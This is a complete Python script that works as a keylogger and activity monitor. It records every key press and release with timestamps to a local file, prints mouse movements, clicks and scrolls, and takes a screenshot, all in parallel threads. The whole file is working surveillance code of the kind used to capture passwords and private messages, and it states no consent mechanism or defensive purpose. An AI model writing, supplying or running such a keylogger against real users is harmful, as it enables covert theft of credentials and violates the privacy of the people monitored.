from pynput.keyboard import Listener as kb
import threading
import logging
from pynput.mouse import Listener as ms
import pyautogui
import datetime 
def now_t():
    current_time = datetime.datetime.now() 
    return current_time
def screen_shot():
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save(r'screen_shot_'+str(now_t())+'.png')
def mouse_logger():
    def on_move(x, y):
        print('Pointer moved to {0}'.format(
        (x, y)))
    def on_click(x, y, button, pressed):
        print('{0} at {1}'.format(
        'Pressed' if pressed else 'Released',
        (x, y)))
    def on_scroll(x, y, dx, dy):
        print('Scrolled {0}'.format(
        (x, y)))
    with ms(on_move=on_move,on_click=on_click,on_scroll=on_scroll) as listenerMouse:
        listenerMouse.join()
def key_logger():
    logging.basicConfig(filename="key_log.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')
    def on_press(key):
        logging.info("Key pressed: {0}".format(key))
    def on_release(key): 
        logging.info("Key released: {0}".format(key))
    with kb(on_press=on_press, on_release=on_release) as listener:  
        listener.join() 
t1 = threading.Thread(target=key_logger)
t2 = threading.Thread(target=mouse_logger)
t3 = threading.Thread(target=screen_shot)
t1.start()
t2.start()
t3.start()
